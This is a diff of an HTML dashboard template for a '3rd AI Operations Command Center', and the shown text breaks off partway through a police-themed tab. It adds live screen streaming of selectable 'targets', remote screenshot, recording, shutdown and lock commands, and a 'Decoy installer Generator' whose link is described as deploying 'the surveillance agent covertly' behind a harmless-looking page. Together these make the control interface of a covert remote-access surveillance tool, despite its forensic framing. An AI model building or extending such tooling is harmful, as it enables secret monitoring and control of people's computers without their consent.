@@ -1,95 +1,1018 @@
 <!DOCTYPE html>
 <html xmlns:th="http://www.thymeleaf.org">
 <head>
-    <title>Guardian | User Dashboard</title>
-    <link rel="stylesheet" th:href="@{/css/style.css}">
+    <title>3rd AI | Operations Command Center</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        body { overflow: auto; padding: 50px 20px; flex-direction: column; height: auto; }
-        .dashboard-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 30px; width: 100%; max-width: 1200px; margin-top: 30px; }
-        .card { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.1); padding: 30px; border-radius: 15px; text-align: left; }
-        .api-badge { background: rgba(0, 242, 255, 0.1); color: #00f2ff; padding: 10px 15px; border-radius: 5px; font-family: 'Consolas', monospace; font-size: 18px; border: 1px dashed #00f2ff; display: inline-block; margin-top: 10px; }
-        table { width: 100%; border-collapse: collapse; margin-top: 20px; font-size: 14px; }
-        th { color: #00f2ff; border-bottom: 1px solid rgba(255, 255, 255, 0.1); padding: 12px; text-align: left; }
-        td { padding: 12px; border-bottom: 1px solid rgba(255, 255, 255, 0.05); color: #ccc; }
-        .status-tag { padding: 4px 8px; border-radius: 4px; font-size: 11px; font-weight: bold; }
-        .tag-terminated { background: rgba(255, 0, 0, 0.2); color: #ff6b6b; }
-        .full-width { grid-column: span 2; }
-        .success-banner { background: rgba(0, 255, 0, 0.1); color: #6bff6b; padding: 15px; border-radius: 8px; margin-bottom: 20px; border: 1px solid green; width: 100%; max-width: 1200px; }
+        :root {
+            --primary: #00f2fe;
+            --accent: #9d4edd;
+            --bg-dark: #06070a;
+            --card-bg: rgba(13, 17, 28, 0.45);
+            --border: rgba(255, 255, 255, 0.05);
+            --border-glow: rgba(0, 242, 254, 0.2);
+            --danger: #ff3b30;
+            --success: #10b981;
+            --text-dim: #94a3b8;
+            --police-blue: #0066ff;
+            --police-glow: rgba(0, 102, 255, 0.35);
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Outfit', sans-serif;
+            background: var(--bg-dark);
+            background-image: 
+                radial-gradient(circle at 50% 10%, rgba(157, 78, 221, 0.08) 0%, transparent 60%),
+                radial-gradient(circle at 10% 50%, rgba(0, 242, 254, 0.05) 0%, transparent 50%);
+            background-size: cover;
+            background-attachment: fixed;
+            color: #f8fafc;
+            min-height: 100vh;
+            display: flex;
+            overflow-x: hidden;
+        }
+
+        /* Ambient glows */
+        .ambient-glow {
+            position: absolute; width: 300px; height: 300px; border-radius: 50%;
+            background: var(--primary); opacity: 0.03; filter: blur(100px); pointer-events: none; z-index: 1;
+        }
+
+        /* Sidebar Design */
+        .sidebar {
+            width: 280px;
+            background: rgba(10, 12, 20, 0.7);
+            backdrop-filter: blur(25px);
+            border-right: 1px solid var(--border);
+            padding: 30px 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            position: fixed;
+            height: 100vh;
+            z-index: 100;
+            transition: all 0.3s ease;
+        }
+
+        .sidebar-brand {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding-bottom: 30px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            margin-bottom: 30px;
+        }
+
+        .brand-logo {
+            font-size: 24px;
+            font-weight: 800;
+            letter-spacing: 2px;
+            background: linear-gradient(135deg, #fff 0%, var(--primary) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 20px rgba(0, 242, 254, 0.3);
+        }
+
+        .nav-menu {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            flex-grow: 1;
+        }
+
+        .nav-item {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            padding: 14px 18px;
+            border-radius: 12px;
+            color: var(--text-dim);
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 15px;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            border: 1px solid transparent;
+        }
+
+        .nav-item:hover {
+            color: #fff;
+            background: rgba(255, 255, 255, 0.02);
+        }
+
+        .nav-item.active {
+            color: #fff;
+            background: rgba(0, 242, 254, 0.06);
+            border-color: rgba(0, 242, 254, 0.15);
+            box-shadow: 0 4px 20px rgba(0, 242, 254, 0.05), inset 0 0 8px rgba(0, 242, 254, 0.05);
+        }
+
+        .sidebar-footer {
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+            padding-top: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        /* Main Content Container */
+        .main-content {
+            margin-left: 280px;
+            flex-grow: 1;
+            padding: 40px;
+            min-height: 100vh;
+            position: relative;
+            z-index: 10;
+            transition: all 0.3s ease;
+        }
+
+        /* Top Header Control Area */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 40px;
+            background: rgba(13, 17, 28, 0.4);
+            backdrop-filter: blur(20px);
+            padding: 15px 30px;
+            border-radius: 16px;
+            border: 1px solid var(--border);
+            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.3);
+        }
+
+        .role-badge {
+            font-size: 12px;
+            font-weight: 800;
+            letter-spacing: 1.5px;
+            padding: 6px 16px;
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            text-transform: uppercase;
+        }
+
+        .badge-admin {
+            background: rgba(157, 78, 221, 0.15);
+            color: #d78cfc;
+            border: 1px solid rgba(157, 78, 221, 0.3);
+            box-shadow: 0 0 15px rgba(157, 78, 221, 0.15);
+        }
+
+        .badge-police {
+            background: rgba(0, 102, 255, 0.15);
+            color: #63a4ff;
+            border: 1px solid rgba(0, 102, 255, 0.3);
+            box-shadow: 0 0 15px rgba(0, 102, 255, 0.15);
+        }
+
+        /* Cards Layout */
+        .card {
+            background: var(--card-bg);
+            backdrop-filter: blur(25px);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            padding: 30px;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            transition: all 0.4s cubic-bezier(0.165, 0.84, 0.44, 1);
+        }
+
+        .card:hover {
+            border-color: var(--border-glow);
+            transform: translateY(-4px);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6), 0 0 25px rgba(0, 242, 254, 0.05);
+        }
+
+        .card::before {
+            content: ""; position: absolute; top: 0; left: 0; width: 100%; height: 2px;
+            background: linear-gradient(90deg, transparent, var(--primary), transparent);
+            opacity: 0.3;
+        }
+
+        .card-header-custom {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 25px;
+        }
+
+        .card-title-custom {
+            font-size: 16px;
+            font-weight: 800;
+            color: #fff;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .card-title-custom span.dot {
+            display: inline-block; width: 8px; height: 8px; border-radius: 50%;
+            background: var(--primary); box-shadow: 0 0 10px var(--primary);
+        }
+
+        /* Dashboard Grid layouts */
+        .dashboard-grid {
+            display: grid;
+            grid-template-columns: 1.6fr 1fr;
+            gap: 30px;
+        }
+
+        /* Live Stream Frame */
+        .stream-frame {
+            border-radius: 16px;
+            overflow: hidden;
+            background: #000;
+            border: 1px solid var(--border);
+            position: relative;
+            aspect-ratio: 16/10;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .stream-frame img {
+            width: 100%; height: 100%; object-fit: contain;
+        }
+
+        .scanline-hud {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.12) 50%),
+                        linear-gradient(90deg, rgba(255, 0, 0, 0.01), rgba(0, 255, 0, 0.005), rgba(0, 0, 255, 0.01));
+            background-size: 100% 4px, 4px 100%;
+            z-index: 10; pointer-events: none; opacity: 0.45;
+        }
+
+        .laser-sweep {
+            position: absolute; top: 0; left: 0; width: 100%; height: 2px;
+            background: rgba(0, 242, 254, 0.6); box-shadow: 0 0 20px var(--primary);
+            z-index: 11; pointer-events: none;
+            animation: sweep 4s linear infinite;
+        }
+
+        @keyframes sweep {
+            0% { top: 0; }
+            100% { top: 100%; }
+        }
+
+        /* Buttons and Inputs */
+        .btn-custom {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            background: rgba(255, 255, 255, 0.03);
+            color: #fff;
+            border: 1px solid var(--border);
+            padding: 14px 24px;
+            border-radius: 12px;
+            cursor: pointer;
+            font-weight: 700;
+            font-size: 14px;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .btn-custom:hover {
+            background: var(--primary);
+            color: #000;
+            border-color: var(--primary);
+            box-shadow: 0 8px 25px rgba(0, 242, 254, 0.2);
+            transform: translateY(-2px);
+        }
+
+        .btn-danger-custom {
+            border-color: rgba(255, 59, 48, 0.3);
+        }
+
+        .btn-danger-custom:hover {
+            background: var(--danger);
+            color: #fff;
+            border-color: var(--danger);
+            box-shadow: 0 8px 25px rgba(255, 59, 48, 0.3);
+        }
+
+        .btn-primary-gradient {
+            background: linear-gradient(135deg, var(--primary) 0%, #0072ff 100%);
+            border: none;
+            color: #000;
+        }
+
+        .btn-primary-gradient:hover {
+            box-shadow: 0 8px 25px rgba(0, 242, 254, 0.3);
+        }
+
+        .input-custom {
+            width: 100%;
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid var(--border);
+            padding: 14px 18px;
+            border-radius: 12px;
+            color: #fff;
+            outline: none;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            transition: all 0.3s;
+        }
+
+        .input-custom:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 15px rgba(0, 242, 254, 0.1);
+        }
+
+        /* Log tables */
+        .table-container {
+            width: 100%; overflow-x: auto;
+            border-radius: 16px; border: 1px solid var(--border);
+            background: rgba(0, 0, 0, 0.2);
+        }
+
+        table { width: 100%; border-collapse: collapse; text-align: left; }
+        th {
+            padding: 18px 24px; font-size: 11px; color: var(--text-dim);
+            text-transform: uppercase; letter-spacing: 1.5px;
+            border-bottom: 1px solid var(--border);
+            font-weight: 700; background: rgba(0,0,0,0.3);
+        }
+        td {
+            padding: 16px 24px; font-size: 14px; border-bottom: 1px solid rgba(255,255,255,0.02);
+            color: #e2e8f0; vertical-align: middle;
+        }
+        tr:hover { background: rgba(255, 255, 255, 0.01); }
+
+        /* Timeline and Logs */
+        .terminal-stream {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            color: #10b981;
+            padding: 20px;
+            background: rgba(0,0,0,0.5);
+            border-radius: 14px;
+            height: 250px;
+            overflow-y: auto;
+            border: 1px solid rgba(16, 185, 129, 0.15);
+            box-shadow: inset 0 0 20px rgba(0,0,0,0.8);
+            line-height: 1.6;
+        }
+
+        .evidence-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            gap: 20px;
+        }
+
+        .evidence-item {
+            background: #000;
+            border-radius: 12px;
+            border: 1px solid var(--border);
+            overflow: hidden;
+            position: relative;
+            aspect-ratio: 16/9;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .evidence-item:hover {
+            border-color: var(--primary);
+            box-shadow: 0 0 20px rgba(0, 242, 254, 0.2);
+            transform: scale(1.03);
+        }
+
+        .evidence-item img, .evidence-item video {
+            width: 100%; height: 100%; object-fit: cover; opacity: 0.7; transition: 0.3s;
+        }
+
+        .evidence-item:hover img, .evidence-item:hover video { opacity: 1; }
+
+        .time-tag {
+            position: absolute; bottom: 0; left: 0; right: 0;
+            background: rgba(10, 12, 20, 0.85); font-size: 10px;
+            padding: 6px 12px; text-align: center; border-top: 1px solid var(--border);
+            font-family: 'JetBrains Mono', monospace; color: var(--text-dim);
+        }
+
+        /* Skeleton load indicator */
+        .skeleton {
+            background: linear-gradient(90deg, rgba(255,255,255,0.03) 25%, rgba(255,255,255,0.08) 50%, rgba(255,255,255,0.03) 75%);
+            background-size: 200% 100%;
+            animation: loading 1.5s infinite;
+        }
+
+        @keyframes loading {
+            0% { background-position: 200% 0; }
+            100% { background-position: -200% 0; }
+        }
+
+        /* Responsive */
+        @media(max-width: 1200px) {
+            .dashboard-grid { grid-template-columns: 1fr; }
+        }
+
+        /* Status indicator tags */
+        .status-pill {
+            display: inline-flex; align-items: center; gap: 6px;
+            font-size: 11px; font-weight: 800; text-transform: uppercase;
+            padding: 4px 12px; border-radius: 20px;
+        }
+
+        .status-secure { background: rgba(16, 185, 129, 0.15); color: var(--success); border: 1px solid rgba(16, 185, 129, 0.25); }
+        .status-breach { background: rgba(255, 59, 48, 0.15); color: var(--danger); border: 1px solid rgba(255, 59, 48, 0.25); }
+        .status-alert { background: rgba(245, 158, 11, 0.15); color: #f59e0b; border: 1px solid rgba(245, 158, 11, 0.25); }
+
+        /* Dashboard Tabs visibility helper */
+        .tab-content { display: none; }
+        .tab-content.active-tab { display: block; animation: tabFade 0.4s ease-out; }
+
+        @keyframes tabFade {
+            from { opacity: 0; transform: translateY(12px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Heartbeat status */
+        .heartbeat-ring {
+            width: 50px; height: 50px; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            border: 2px solid var(--success);
+            box-shadow: 0 0 15px rgba(16, 185, 129, 0.2);
+            animation: pulse-ring 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
+        }
+
+        @keyframes pulse-ring {
+            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.4); }
+            70% { transform: scale(1.05); box-shadow: 0 0 0 10px rgba(16, 185, 129, 0); }
+            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
+        }
     </style>
 </head>
 <body>
-    <h2 style="margin-bottom: 5px;">COMMAND CENTER</h2>
-    <p style="color: #888;">Welcome back, <span th:text="${user.email}" style="color: white;"></span></p>
 
-    <div th:if="${param.success}" class="success-banner">
-        ✅ Telegram settings updated successfully!
-    </div>
+    <div class="ambient-glow" style="top: 10%; left: 20%;"></div>
+    <div class="ambient-glow" style="bottom: 15%; right: 10%;"></div>
 
-    <div class="dashboard-grid">
-        <!-- API Key Card -->
-        <div class="card">
-            <h3 style="color: #00f2ff; margin-bottom: 15px;">Your Protection Key</h3>
-            <p style="font-size: 14px; color: #aaa;">Use this key in your Desktop Agent to link this account.</p>
-            <div class="api-badge" th:text="${user.apiKey}">XXXX-XXXX</div>
+    <!-- Sidebar menu panel -->
+    <aside class="sidebar">
+        <div>
+            <div class="sidebar-brand">
+                <span style="font-size: 28px;">🛡️</span>
+                <span class="brand-logo">3RD AI</span>
+            </div>
+
+            <nav class="nav-menu">
+                <div class="nav-item active" onclick="switchTab('hub-tab', this)">
+                    <span>🏠</span> Hub Overview
+                </div>
+                <div class="nav-item" onclick="switchTab('telemetry-tab', this)">
+                    <span>🖥️</span> Live Telemetry
+                </div>
+                <!-- Admin control tab only visible to Admin -->
+                <div class="nav-item" id="adminNavBtn" th:if="${role == 'ADMIN'}" onclick="switchTab('controls-tab', this)">
+                    <span>🎮</span> Admin Controls
+                </div>
+                <div class="nav-item" onclick="switchTab('police-tab', this)">
+                    <span>⚖️</span> Threat Room
+                </div>
+                <div class="nav-item" onclick="switchTab('deploy-tab', this)">
+                    <span>🚀</span> Deployment Agent
+                </div>
+            </nav>
         </div>
 
-        <!-- Telegram Config Card -->
-        <div class="card">
-            <h3 style="color: #00f2ff; margin-bottom: 15px;">Remote Alerts (Telegram)</h3>
-            
-            <!-- Manual Form First -->
-            <form th:action="@{/save-telegram}" method="post">
-                <input type="hidden" name="apiKey" th:value="${user.apiKey}">
-                <div class="input-group">
-                    <label>Bot Token</label>
-                    <input type="text" name="botToken" th:value="${user.telegramBotToken}" placeholder="Enter your Bot Token" required>
-                </div>
-                <div class="input-group">
-                    <label>Chat ID</label>
-                    <input type="text" name="chatId" th:value="${user.telegramChatId}" placeholder="Enter your Chat ID" required>
-                </div>
-                <button type="submit" class="btn" style="margin-top: 0; background: linear-gradient(135deg, #00f2ff 0%, #0072ff 100%);">Save Bot Settings</button>
-            </form>
+        <div class="sidebar-footer">
+            <div style="font-size: 11px; color: var(--text-dim); text-align: center; font-family: 'JetBrains Mono', monospace;">
+                Node key: <span th:text="${user.apiKey}" style="color: var(--primary);">ABC123XY</span>
+            </div>
+            <a href="/logout" class="btn-custom btn-danger-custom" style="text-decoration: none; padding: 12px;">
+                🚪 Logout Terminal
+            </a>
+        </div>
+    </aside>
 
-            <hr style="margin: 25px 0; border: none; border-top: 1px solid rgba(255, 255, 255, 0.1);">
+    <!-- Main operations screen -->
+    <main class="main-content">
+        <!-- Operations header -->
+        <header class="header">
+            <div>
+                <h1 style="font-size: 22px; font-weight: 800; letter-spacing: 1px;">Operations Control Center</h1>
+                <p style="font-size: 13px; color: var(--text-dim); margin-top: 4px;">Node Identification: <span th:text="${user.email}" style="color: #fff; font-weight: 600;">admin@guardian.com</span></p>
+            </div>
 
-            <!-- One Click as Optional -->
-            <div style="background: rgba(0, 242, 255, 0.05); border: 1px solid rgba(0, 242, 255, 0.1); padding: 15px; border-radius: 10px;">
-                <p style="font-size: 13px; margin-bottom: 10px; color: #aaa;">Alternative: One-Click Connection</p>
-                <a th:href="'https://t.me/Ak47_kumar_bot?start=' + ${user.email}" target="_blank" class="btn" style="text-decoration: none; display: block; text-align: center; background: #222; font-size: 14px; padding: 10px;">
-                    🔗 Link via Official Bot
-                </a>
+            <div style="display: flex; gap: 20px; align-items: center;">
+                <!-- Target Dropdown -->
+                <form id="targetForm" method="GET" action="/dashboard" style="display: flex; align-items: center; gap: 10px;">
+                    <input type="hidden" name="apiKey" th:value="${user.apiKey}">
+                    <input type="hidden" name="role" th:value="${role}">
+                    <select name="targetId" onchange="document.getElementById('targetForm').submit();" style="padding: 10px 18px; border-radius: 10px; background: rgba(0, 0, 0, 0.4); color: var(--primary); border: 1px solid var(--border); outline: none; font-weight: 600; font-size: 13px; cursor: pointer;">
+                        <option value="ALL" th:selected="${currentTarget == 'ALL'}">🔍 ALL TARGETS</option>
+                        <option th:each="t : ${targets}" th:value="${t}" th:text="${t}" th:selected="${t == currentTarget}"></option>
+                    </select>
+                </form>
+
+                <!-- Glowing Role tag -->
+                <div th:if="${role == 'ADMIN'}" class="role-badge badge-admin">
+                    👑 Root Admin
+                </div>
+                <div th:if="${role == 'POLICE'}" class="role-badge badge-police">
+                    🛡️ Forensic Officer
+                </div>
+            </div>
+        </header>
+
+        <!-- Dynamic Warnings -->
+        <div id="kavachAlertBanner" style="display:none; background: rgba(239, 68, 68, 0.15); border: 1px solid var(--danger); padding: 18px; border-radius: 14px; margin-bottom: 30px; color: #fca5a5; font-weight: 600; text-align: center; box-shadow: 0 0 20px rgba(255, 59, 48, 0.1);">
+            ⚠️ CRITICAL INTRUSION: AI Kavach Shield has logged suspicious real-time surveillance activity! Case dispatch initiated to AI Police headquarters.
+        </div>
+
+        <!-- ==================== TAB 1: HUB OVERVIEW ==================== -->
+        <div id="hub-tab" class="tab-content active-tab">
+            <div class="dashboard-grid">
+                <div class="card" style="display: flex; flex-direction: column; justify-content: space-between;">
+                    <div>
+                        <div class="card-header-custom">
+                            <h2 class="card-title-custom"><span class="dot"></span> System Live Health Status</h2>
+                            <span class="status-pill status-secure" id="shieldLabel">Shield Active</span>
+                        </div>
+                        
+                        <div style="display: flex; align-items: center; gap: 25px; margin: 30px 0;">
+                            <div class="heartbeat-ring" id="heartbeatNode">
+                                <span style="font-size: 20px;">🛡️</span>
+                            </div>
+                            <div>
+                                <h3 style="font-size: 24px; font-weight: 800;" id="kavachPulseText">Security Shield Engaged</h3>
+                                <p style="font-size: 13px; color: var(--text-dim); margin-top: 4px;">Node scanning active with continuous process auditing.</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; border-top: 1px solid rgba(255,255,255,0.05); padding-top: 30px;">
+                        <div>
+                            <p style="font-size: 11px; color: var(--text-dim); uppercase; letter-spacing: 1px;">TOTAL SYSTEM EVENTS</p>
+                            <h4 style="font-size: 32px; font-weight: 800; color: var(--primary);" th:text="${totalBreaches}">12</h4>
+                        </div>
+                        <div>
+                            <p style="font-size: 11px; color: var(--text-dim); uppercase; letter-spacing: 1px;">ACTIVE PROTECTED NODES</p>
+                            <h4 style="font-size: 32px; font-weight: 800; color: #a855f7;" th:text="${activeUsers}">2</h4>
+                        </div>
+                        <div>
+                            <p style="font-size: 11px; color: var(--text-dim); uppercase; letter-spacing: 1px;">CRITICAL THREAT AUDITS</p>
+                            <h4 style="font-size: 32px; font-weight: 800; color: var(--danger);" th:text="${criticalAlerts}">0</h4>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card" style="background: linear-gradient(135deg, rgba(13, 17, 28, 0.45) 0%, rgba(157, 78, 221, 0.05) 100%);">
+                    <div class="card-title-custom" style="margin-bottom: 20px;"><span class="dot" style="background:#a855f7; box-shadow:0 0 10px #a855f7;"></span> Unified Controls Quick Actions</div>
+                    <p style="font-size: 13px; color: var(--text-dim); margin-bottom: 30px;">Execute remote actions or configure telemetry. Non-admins have read-only audit controls.</p>
+                    
+                    <div style="display: flex; flex-direction: column; gap: 15px;">
+                        <button class="btn-custom btn-primary-gradient" onclick="switchTab('telemetry-tab')">
+                            🖥️ Open Live Telemetry Stream
+                        </button>
+                        
+                        <!-- Toggle Kavach Shield (Admin Only) -->
+                        <button th:if="${role == 'ADMIN'}" id="hubKavachBtn" class="btn-custom" onclick="toggleKavach()" style="background: rgba(16, 185, 129, 0.1); border-color: rgba(16, 185, 129, 0.3); color: var(--success);">
+                            🛡️ Disable AI Kavach Shield
+                        </button>
+                        <button th:unless="${role == 'ADMIN'}" class="btn-custom" disabled style="opacity: 0.5; cursor: not-allowed;">
+                            🛡️ Kavach Control Locked
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Global Live Activity timeline teaser -->
+            <div class="card" style="margin-top: 30px;">
+                <div class="card-header-custom">
+                    <h2 class="card-title-custom"><span class="dot" style="background: #10b981; box-shadow: 0 0 10px #10b981;"></span> Real-Time Operation Stream</h2>
+                    <span style="font-size: 11px; font-family: monospace; color: #10b981; text-transform: uppercase;">● live feeds online</span>
+                </div>
+                <div class="terminal-stream" id="liveFeedHub">
+                    <div>[SYSTEM INITIALIZATION] Establishing secure operation feed...</div>
+                </div>
             </div>
         </div>
 
-        <!-- Logs Card -->
-        <div class="card full-width">
-            <h3 style="color: #00f2ff; margin-bottom: 10px;">Live Security Logs</h3>
-            <p style="font-size: 14px; color: #aaa;">All security events from your linked PC(s).</p>
-            <table>
-                <thead>
-                    <tr>
-                        <th>Timestamp</th>
-                        <th>Application</th>
-                        <th>Action</th>
-                        <th>Details</th>
-                    </tr>
-                </thead>
-                <tbody>
-                    <tr th:each="log : ${logs}">
-                        <td th:text="${#temporals.format(log.timestamp, 'yyyy-MM-dd HH:mm:ss')}"></td>
-                        <td th:text="${log.appName}" style="font-weight: bold; color: white;"></td>
-                        <td><span class="status-tag tag-terminated" th:text="${log.action}"></span></td>
-                        <td th:text="${log.details}" style="font-size: 12px; color: #888;"></td>
-                    </tr>
-                    <tr th:if="${#lists.isEmpty(logs)}">
-                        <td colspan="4" style="text-align: center; padding: 40px; color: #555;">No security breaches detected yet. You are safe!</td>
-                    </tr>
-                </tbody>
-            </table>
+        <!-- ==================== TAB 2: LIVE TELEMETRY ==================== -->
+        <div id="telemetry-tab" class="tab-content">
+            <div class="card" style="padding: 10px; margin-bottom: 30px;">
+                <div class="card-header-custom" style="padding: 20px 20px 10px 20px;">
+                    <h2 class="card-title-custom"><span class="dot"></span> Live Screen Stream Frame</h2>
+                    <div class="status-pill status-breach" style="animation: pulse-ring 2s infinite;">🔴 LIVE MONITOR</div>
+                </div>
+                <div class="stream-frame">
+                    <div class="scanline-hud"></div>
+                    <div class="laser-sweep"></div>
+                    <img id="liveMonitorSrc" th:src="@{'/api/live-stream?targetId=' + ${currentTarget}}" alt="Live Stream Monitor">
+                </div>
+            </div>
+
+            <!-- ADMINISTRATIVE REMOTE CONTROLS (ONLY VISIBLE TO ROOT ADMIN UNDER THE LIVE MONITOR) -->
+            <div class="card" th:if="${role == 'ADMIN'}" style="margin-bottom: 30px; background: linear-gradient(135deg, rgba(13, 17, 28, 0.55) 0%, rgba(239, 68, 68, 0.03) 100%); border-color: rgba(239, 68, 68, 0.15);">
+                <div class="card-header-custom" style="margin-bottom: 20px;">
+                    <h2 class="card-title-custom"><span class="dot" style="background:#ef4444; box-shadow:0 0 10px #ef4444;"></span> Active System Overrides Command Panel</h2>
+                    <span style="font-size: 11px; font-family: monospace; color: #ef4444; text-transform: uppercase;">⚡ Remote Command Dispatcher</span>
+                </div>
+                
+                <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; margin-bottom: 20px;">
+                    <button class="btn-custom" onclick="sendCommand('SCREENSHOT')">📸 Capture Screen</button>
+                    <button class="btn-custom" onclick="sendCommand('RECORD')">🎥 Record Stream (10s)</button>
+                    <button class="btn-custom" onclick="sendCommand('SLEEP')">🌙 Trigger Sleep</button>
+                    <button class="btn-custom btn-danger-custom" onclick="sendCommand('SHUTDOWN')">🔌 Hard Shutdown</button>
+                </div>
+
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px; border-top: 1px solid rgba(255,255,255,0.05); padding-top: 20px;">
+                    <button class="btn-custom" onclick="sendCommand('LOCK')" style="border-color: rgba(245, 158, 11, 0.3); color: #f59e0b; background: rgba(245, 158, 11, 0.05);">🔐 Engaged Lock PC</button>
+                    <button class="btn-custom" onclick="sendCommand('UNLOCK')" style="border-color: rgba(16, 185, 129, 0.3); color: var(--success); background: rgba(16, 185, 129, 0.05);">🔓 Release Lock PC</button>
+                </div>
+            </div>
+
+            <!-- Media evidence grid -->
+            <div class="card">
+                <div class="card-header-custom">
+                    <h2 class="card-title-custom"><span class="dot" style="background: var(--accent); box-shadow: 0 0 10px var(--accent);"></span> Screen Evidence Records</h2>
+                </div>
+                <div class="evidence-grid">
+                    <div th:each="file : ${screenshots}" class="evidence-item">
+                        <!-- Image representation -->
+                        <img th:if="${!file.endsWith('.mp4')}" th:src="@{'/api/screenshots/' + ${file} + '?targetId=' + ${currentTarget}}" alt="Forensic Image Capture" onclick="window.open(this.src)">
+                        <!-- Video representation -->
+                        <video th:if="${file.endsWith('.mp4')}" controls style="width: 100%; height: 100%; object-fit: cover;">
+                            <source th:src="@{'/api/screenshots/' + ${file} + '?targetId=' + ${currentTarget}}" type="video/mp4">
+                        </video>
+                        <div class="time-tag" th:text="${file}">screenshot_2024.png</div>
+                    </div>
+                    <div th:if="${#lists.isEmpty(screenshots)}" style="grid-column: span 3; text-align: center; padding: 60px; color: var(--text-dim);">
+                        No screen evidence records captured. Perform "Screenshot" or "Record" controls to capture evidence.
+                    </div>
+                </div>
+            </div>
         </div>
-    </div>
-    
-    <a href="/login" style="margin-top: 30px; color: #555; text-decoration: none; font-size: 14px;">Logout from Session</a>
+
+        <!-- ==================== TAB 3: ADMIN CONFIGURATION & DECOYS (ADMIN ONLY) ==================== -->
+        <div id="controls-tab" class="tab-content" th:if="${role == 'ADMIN'}">
+            <div class="dashboard-grid" style="grid-template-columns: 1fr 1fr; gap: 30px;">
+                <!-- Decoy installer generator card -->
+                <div class="card">
+                    <div class="card-title-custom" style="margin-bottom: 15px;"><span class="dot" style="background:#eab308; box-shadow:0 0 10px #eab308;"></span> Decoy installer Generator</div>
+                    <p style="font-size: 13px; color: var(--text-dim); margin-bottom: 20px;">Use this decoy installer URL link to deploy the surveillance agent covertly. Emojis will show up during background installation.</p>
+                    <div style="display: flex; gap: 10px;">
+                        <input type="text" id="decoyField" readonly class="input-custom" value="http://localhost:8081/funny-stuff">
+                        <button class="btn-custom btn-primary-gradient" onclick="copyDecoyLink()" style="padding: 14px 20px;">Copy Link</button>
+                    </div>
+                </div>
+
+                <!-- Telegram configuration credentials card -->
+                <div class="card">
+                    <div class="card-title-custom" style="margin-bottom: 15px;"><span class="dot"></span> Telegram Automation credentials</div>
+                    <form action="/save-telegram" method="POST" style="display: flex; flex-direction: column; gap: 15px;">
+                        <input type="hidden" name="apiKey" th:value="${user.apiKey}">
+                        <input type="hidden" name="role" th:value="${role}">
+                        <div>
+                            <label style="font-size: 12px; color: var(--text-dim); display:block; margin-bottom:6px;">TELEGRAM BOT TOKEN</label>
+                            <input type="text" name="botToken" class="input-custom" th:value="${user.telegramBotToken}" placeholder="878057...:AAEWFD...">
+                        </div>
+                        <div>
+                            <label style="font-size: 12px; color: var(--text-dim); display:block; margin-bottom:6px;">TELEGRAM CHAT ID</label>
+                            <input type="text" name="chatId" class="input-custom" th:value="${user.telegramChatId}" placeholder="1123697...">
+                        </div>
+                        <button type="submit" class="btn-custom" style="width: 100%;">💾 Save Configuration</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+
+        <!-- ==================== TAB 4: POLICE THREAT ROOM ==================== -->
+        <div id="police-tab" class="tab-content">
+            <!-- Summary stats -->
+            <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; margin-bottom: 30px;">
+                <div class="card" style="padding: 20px;">
+                    <p style="font-size: 11px; color: var(--text-dim); text-transform: uppercase;">INCIDENTS LOGGED</p>
